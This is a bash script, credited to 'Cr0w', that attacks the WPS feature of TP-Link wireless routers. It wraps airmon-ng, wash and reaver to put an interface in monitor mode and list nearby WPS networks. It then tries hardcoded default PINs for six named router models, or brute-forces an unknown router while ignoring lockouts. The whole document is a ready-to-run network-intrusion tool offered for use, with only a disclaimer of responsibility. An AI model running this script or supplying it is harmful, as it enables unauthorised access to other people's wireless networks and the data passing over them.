#!/bin/bash
airmon-ng stop mon0 1>/dev/null
clear
f_tl(){
echo
echo -e "\e[0;34m _______  _____             _____ __   _ _     _"
echo -e "\e[0;34m    |    |_____] ___ |        |   | \  | |____/ "
echo -e "\e[0;34m    |    |           |_____ __|__ |  \_| |    \_\e[0m"
echo
echo "       1. TL-WR740N"
echo "       2. TL-WR741N"
echo "       3. TL-WR841N"
echo "       4. TL-WR842ND"
echo "       5. TL-WR941ND"
echo "       6. TD-W8961ND"
echo -e "       \e[1;30m7. Unknown & Other routers (may take alot of time)\e[0m"
echo -n "Choice: "
}
f_splash(){
echo -e "\e[1;32m _________         _______          "
echo -e "\e[1;32m \_   ___ \_______ \   _  \__  _  __"
echo -e "\e[1;32m /    \  \/\_  __ \/  /_\  \ \/ \/ /"
echo -e "\e[1;32m \     \____|  | \/\  \_/   \     / "
echo -e "\e[1;32m  \______  /|__|    \_____  /\/\_/  "
echo -e "\e[1;32m         \/               \/        "
echo -e "\e[0m"
echo -e "\e[1;30m[+] TP-Link Cr4ck3r by Cr0w"
echo -e "[+]\e[0;34m cr0w@tutanota.de \e[0m"
echo -e "\e[1;30m[+] Reaver tool is required!, for this script to run.\e[0m" 
echo 
echo -e "\e[1;31mi'm not responsible for any illegal use of this script ! \e[0m"
echo
read -p "Press <enter> to continue."
}
f_splash
clear
echo -n "Enter your interface to be used for the Attack, for example wlan0: "
read -e interface
if [ -z $interface ];then
	echo -e "\e[1;31m                  *** Invalid choice or entry. ***\e[0m"
		exit
		fi
clear
read -p "Do a quick wps scan, Press <enter> to start"
clear
airmon-ng start $interface 1>/dev/null
wash -i mon0 ; sleep 15 ; f_tl
read choice
if [ -z $choice ]; then
	echo -e "\e[1;31m                  *** Invalid choice or entry. ***\e[0m"
		exit
		fi
clear
echo "Enter the BSSID you would like to crack: e.x AA:A1:A2:A3:A4:A5: "
read -e BSSID
if [ -z $BSSID ]; then
	echo -e "\e[1;31m                  *** Invalid choice or entry. ***\e[0m"
		exit
		fi
airmon-ng start $interface 1>/dev/null
interface="mon0" 1>/dev/null
clear
if [ $choice = 1 ];then
	reaver -i mon0 -b $BSSID -p 43671243
	fi
if [ $choice = 2 ];then
	reaver -i mon0 -b $BSSID -p 66870913
	fi
if [ $choice = 3 ];then
	reaver -i mon0 -b $BSSID -p 85075542
	fi
if [ $choice = 4 ];then 
	reaver -i mon0 -b $BSSID -p 55117319
	fi
if [ $choice = 5 ];then 
	reaver -i mon0 -b $BSSID -p 75304928 37632847
	fi
if [ $choice = 6 ];then 
	reaver -i mon0 -b $BSSID -p 56738209 40176451 37493691 57739601 40184708 40166148 93834186 61116597 37505073 37489014 37490034 37494650 37496081 37494063 37494506
	fi	
if [ $choice = 7 ];then 
	reaver -i mon0 -f -b $BSSID --no-nacks --ignore-locks --fail-wait=360 -v --dh-small 
	fi	
airmon-ng stop mon0 1>/dev/null
